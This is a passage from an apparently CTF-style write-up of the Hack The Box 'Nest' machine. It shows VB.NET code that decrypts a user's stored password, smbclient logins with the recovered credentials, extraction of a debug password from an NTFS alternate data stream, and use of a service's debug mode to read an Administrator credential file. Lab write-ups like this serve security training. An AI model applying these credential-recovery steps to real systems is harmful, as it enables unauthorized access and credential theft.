+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">saltValueBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">saltValueBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">cipherTextBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">cipherTextBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                          </span><span class="n">saltValueBytes</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                          </span><span class="n">passwordIterations</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">keyBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">keyBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">password</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="k">CInt</span><span class="p">(</span><span class="n">keySize</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="p">))</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">symmetricKey</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">AesCryptoServiceProvider</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">symmetricKey</span><span class="p">.</span><span class="n">Mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">decryptor</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">ICryptoTransform</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">decryptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">symmetricKey</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">keyBytes</span><span class="p">,</span><span class="w"> </span><span class="n">initVectorBytes</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">memoryStream</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">memoryStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">cryptoStream</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">CryptoStream</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">cryptoStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                        </span><span class="n">decryptor</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                        </span><span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">plainTextBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">ReDim</span><span class="w"> </span><span class="n">plainTextBytes</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">decryptedByteCount</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Integer</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">decryptedByteCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                              </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                              </span><span class="n">plainTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="n">memoryStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">plainText</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">plainText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                            </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                            </span><span class="n">decryptedByteCount</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Return</span><span class="w"> </span><span class="n">plainText</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span></span>
+<span class="code-line"><span class="k">End</span><span class="w"> </span><span class="k">Class</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We fire up a Windows Box, install Microsoft Visual Basic 2010 Express and create
+a new "Application Console project" with a simple module to decode the c.smith
+password we got in the XML file.</p>
+<p><img alt="creating a Application Console project" src="/media/2020.06/nest_02.png"></p>
+<p>The code is the following. As the console is disappearing just after the run I
+put a second print and run the program in debug mode.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="k">Imports</span><span class="w"> </span><span class="nn">System.Text</span><span class="w"></span></span>
+<span class="code-line"><span class="k">Imports</span><span class="w"> </span><span class="nn">System.Security.Cryptography</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">Module</span><span class="w"> </span><span class="nn">Module1</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="k">Sub</span><span class="w"> </span><span class="nf">Main</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">Decrypt</span><span class="p">(</span><span class="s">&quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;N3st22&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;88552299&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;464R5DFA5DL6LE28&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">))</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&quot;</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Sub</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="k">Public</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="nf">Decrypt</span><span class="p">(</span><span class="k">ByVal</span><span class="w"> </span><span class="n">cipherText</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                              </span><span class="k">ByVal</span><span class="w"> </span><span class="n">passPhrase</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                              </span><span class="k">ByVal</span><span class="w"> </span><span class="n">saltValue</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                </span><span class="k">ByVal</span><span class="w"> </span><span class="n">passwordIterations</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Integer</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                              </span><span class="k">ByVal</span><span class="w"> </span><span class="n">initVector</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                              </span><span class="k">ByVal</span><span class="w"> </span><span class="n">keySize</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Integer</span><span class="p">)</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                      </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">initVectorBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">initVectorBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">saltValueBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">saltValueBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">cipherTextBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">cipherTextBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                          </span><span class="n">saltValueBytes</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                          </span><span class="n">passwordIterations</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">keyBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">keyBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">password</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="k">CInt</span><span class="p">(</span><span class="n">keySize</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="p">))</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">symmetricKey</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">AesCryptoServiceProvider</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">symmetricKey</span><span class="p">.</span><span class="n">Mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">decryptor</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">ICryptoTransform</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">decryptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">symmetricKey</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">keyBytes</span><span class="p">,</span><span class="w"> </span><span class="n">initVectorBytes</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">memoryStream</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">memoryStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">cryptoStream</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">CryptoStream</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">cryptoStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                        </span><span class="n">decryptor</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                        </span><span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">plainTextBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">ReDim</span><span class="w"> </span><span class="n">plainTextBytes</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">decryptedByteCount</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Integer</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">decryptedByteCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                              </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                              </span><span class="n">plainTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="n">memoryStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">plainText</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">plainText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                            </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                            </span><span class="n">decryptedByteCount</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Return</span><span class="w"> </span><span class="n">plainText</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">End</span><span class="w"> </span><span class="k">Module</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p><img alt="Running in debug mode" src="/media/2020.06/nest_03.png"></p>
+<p>We get the c.smith password: xRxRxPANCAK3SxRxRx. We can now connect to the
+"Users" share using c.smith account. We got the user.txt file.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># smbclient //10.10.10.178/Users -U &quot;c.smith&quot;%&quot;xRxRxPANCAK3SxRxRx&quot;</span>
+<span class="code-line">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="code-line">smb: \&gt; cd C.Smith\</span>
+<span class="code-line">smb: \C.Smith\&gt; mget user.txt</span>
+<span class="code-line">Get file user.txt? y</span>
+<span class="code-line">getting file \C.Smith\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="getting-root">Getting root</h1>
+<p>We enumerate more and found some configuration about the HQK service (the one on
+port 4386). There is also a file "Debug Mode Password.txt".
+The file can be copied on disk but is empty.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>smb: \C.Smith\&gt; cd &quot;HQK Reporting\&quot;</span>
+<span class="code-line">smb: \C.Smith\HQK Reporting\&gt; dir</span>
+<span class="code-line">  .                                   D        0  Thu Aug  8 19:06:17 2019</span>
+<span class="code-line">  ..                                  D        0  Thu Aug  8 19:06:17 2019</span>
+<span class="code-line">  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019</span>
+<span class="code-line">  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019</span>
+<span class="code-line">  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019</span>
+<span class="code-line"></span>
+<span class="code-line">            10485247 blocks of size 4096. 6449598 blocks available</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="alternate-data-streams">Alternate data streams</h2>
+<p>The file seems to be empty because its author used the <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">NTFS alternate data
+streams</a>.</p>
+<p>It is possible to get the information about the <a href="https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux">alternate data steams for a file
+using smbclient</a>.</p>
+<p>We require the informations about the file in C.Smith folder and we download the
+file using the alternate data stream.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# smbclient //10.10.10.178/Users -U &quot;c.smith&quot;%&quot;xRxRxPANCAK3SxRxRx&quot; -c &#39;allinfo &quot;C.Smith\HQK Reporting\Debug Mode Password.txt&quot;&#39;</span>
+<span class="code-line">altname: DEBUGM~1.TXT</span>
+<span class="code-line">create_time:    Thu Aug  8 07:06:12 PM 2019 EDT</span>
+<span class="code-line">access_time:    Thu Aug  8 07:06:12 PM 2019 EDT</span>
+<span class="code-line">write_time:     Thu Aug  8 07:08:17 PM 2019 EDT</span>
+<span class="code-line">change_time:    Thu Aug  8 07:08:17 PM 2019 EDT</span>
+<span class="code-line">attributes: A (20)</span>
+<span class="code-line">stream: [::$DATA], 0 bytes</span>
+<span class="code-line">stream: [:Password:$DATA], 15 bytes</span>
+<span class="code-line">root@kalili:~# smbclient //10.10.10.178/Users -U &quot;c.smith&quot;%&quot;xRxRxPANCAK3SxRxRx&quot; -c &#39;get &quot;C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA&quot;</span>
+<span class="code-line">&gt; &#39;</span>
+<span class="code-line">getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA of size 15 as C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span>
+<span class="code-line"></code></pre></div>
+
+<p>The file is not empty anymore and contain the password for the DEBUG mode of the HQK service.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# cat C.Smith\\HQK\ Reporting\\Debug\ Mode\ Password.txt\:Password\:\$DATA</span>
+<span class="code-line">WBQ201953D8w</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="hqkldapexe">HqkLdap.exe</h2>
+<p>We enumerate the folder more and we found a HqkLdap.exe binary. We download it
+on our system.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>smb: \C.Smith\HQK Reporting\&gt; cd &quot;AD Integration Module</span>
+<span class="code-line">smb: \C.Smith\HQK Reporting\AD Integration Module\&gt; dir</span>
+<span class="code-line">  .                                   D        0  Fri Aug  9 08:18:42 2019</span>
+<span class="code-line">  ..                                  D        0  Fri Aug  9 08:18:42 2019</span>
+<span class="code-line">  HqkLdap.exe                         A    17408  Wed Aug  7 19:41:16 2019</span>
+<span class="code-line"></span>
+<span class="code-line">                10485247 blocks of size 4096. 6449664 blocks available</span>
+<span class="code-line">smb: \C.Smith\HQK Reporting\AD Integration Module\&gt; mget HqkLdap.exe</span>
+<span class="code-line">Get file HqkLdap.exe? y</span>
+<span class="code-line">getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (9.9 KiloBytes/sec) (average 9.9 KiloBytes/sec)</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="debug-hqk-reporting-service">DEBUG HQK Reporting Service</h2>
+<p>We connect to the service and start the debug mode.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# telnet 10.10.10.178 4386</span>
+<span class="code-line">Trying 10.10.10.178...</span>
+<span class="code-line">Connected to 10.10.10.178.</span>
+<span class="code-line">Escape character is &#39;^]&#39;.</span>
+<span class="code-line"></span>
+<span class="code-line">HQK Reporting Service V1.2</span>
+<span class="code-line"></span>
+<span class="code-line">&gt;DEBUG WBQ201953D8w</span>
+<span class="code-line"></span>
+<span class="code-line">Debug mode enabled. Use the HELP command to view additional commands that are now available</span>
+<span class="code-line"></code></pre></div>
+
+<p>We list the command to see what's new. The new commands are:
+  * SERVICE
+  * SESSION
+  * SHOWQUERY</p>
+<p>We run them, session and service just show use informations about our session
+and the service.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;help</span>
+<span class="code-line"></span>
+<span class="code-line">This service allows users to run queries against databases using the legacy HQK format</span>
+<span class="code-line"></span>
+<span class="code-line">--- AVAILABLE COMMANDS ---</span>
+<span class="code-line"></span>
+<span class="code-line">LIST</span>
+<span class="code-line">SETDIR &lt;Directory_Name&gt;</span>
+<span class="code-line">RUNQUERY &lt;Query_ID&gt;</span>
+<span class="code-line">DEBUG &lt;Password&gt;</span>
+<span class="code-line">HELP &lt;Command&gt;</span>
+<span class="code-line">SERVICE</span>
+<span class="code-line">SESSION</span>
+<span class="code-line">SHOWQUERY &lt;Query_ID&gt;</span>
+<span class="code-line"></span>
+<span class="code-line">&gt;session</span>
+<span class="code-line"></span>
+<span class="code-line">--- Session Information ---</span>
+<span class="code-line"></span>
+<span class="code-line">Session ID: cb4c294e-1f27-4e1c-90e8-86d22367701e</span>
+<span class="code-line">Debug: True</span>
+<span class="code-line">Started At: 1/27/2020 4:33:48 PM</span>
+<span class="code-line">Server Endpoint: 10.10.10.178:4386</span>
+<span class="code-line">Client Endpoint: 10.10.14.30:36462</span>
+<span class="code-line">Current Query Directory: C:\Program Files\HQK\ALL QUERIES</span>
+<span class="code-line"></span>
+<span class="code-line">&gt;service</span>
+<span class="code-line"></span>
+<span class="code-line">--- HQK REPORTING SERVER INFO ---</span>
+<span class="code-line"></span>
+<span class="code-line">Version: 1.2.0.0</span>
+<span class="code-line">Server Hostname: HTB-NEST</span>
+<span class="code-line">Server Process: &quot;C:\Program Files\HQK\HqkSvc.exe&quot;</span>
+<span class="code-line">Server Running As: Service_HQK</span>
+<span class="code-line">Initial Query Directory: C:\Program Files\HQK\ALL QUERIES</span>
+<span class="code-line"></code></pre></div>
+
+<p>We go to the <code>C:\Program Files\HQK\</code> directory.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;list</span>
+<span class="code-line"></span>
+<span class="code-line">Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command</span>
+<span class="code-line"></span>
+<span class="code-line">QUERY FILES IN CURRENT DIRECTORY</span>
+<span class="code-line"></span>
+<span class="code-line">[DIR]  ALL QUERIES</span>
+<span class="code-line">[DIR]  LDAP</span>
+<span class="code-line">[DIR]  Logs</span>
+<span class="code-line">[1]   HqkSvc.exe</span>
+<span class="code-line">[2]   HqkSvc.InstallState</span>
+<span class="code-line">[3]   HQK_Config.xml</span>
+<span class="code-line"></code></pre></div>
+
+<p>The Showquery function allow use to read the files in the current directory.
+The file HQK_Config.xml contain our debugging password and the port of the
+service.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;showquery 3</span>
+<span class="code-line"></span>
+<span class="code-line">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="code-line">&lt;ServiceSettings xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;</span>
+<span class="code-line">  &lt;Port&gt;4386&lt;/Port&gt;</span>
+<span class="code-line">  &lt;DebugPassword&gt;WBQ201953D8w&lt;/DebugPassword&gt;</span>
+<span class="code-line">  &lt;QueryDirectory&gt;C:\Program Files\HQK\ALL QUERIES&lt;/QueryDirectory&gt;</span>
+<span class="code-line">&lt;/ServiceSettings&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>We go to the LDAP directory. We found the exe we already got and a configuration
+file. This file contain the Administrator encoded password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;setdir ldap</span>
+<span class="code-line"></span>
+<span class="code-line">Current directory set to ldap</span>
+<span class="code-line">&gt;list</span>
+<span class="code-line"></span>
+<span class="code-line">Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command</span>
+<span class="code-line"></span>
+<span class="code-line">QUERY FILES IN CURRENT DIRECTORY</span>
+<span class="code-line"></span>
+<span class="code-line">[1]   HqkLdap.exe</span>
+<span class="code-line">[2]   Ldap.conf</span>
+<span class="code-line"></span>
+<span class="code-line">Current Directory: ldap</span>
+<span class="code-line">&gt;showquery 2</span>
+<span class="code-line"></span>
+<span class="code-line">Domain=nest.local</span>
+<span class="code-line">Port=389</span>
+<span class="code-line">BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local</span>
+<span class="code-line">User=Administrator</span>
+<span class="code-line">Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</span>
+<span class="code-line"></code></pre></div>
+
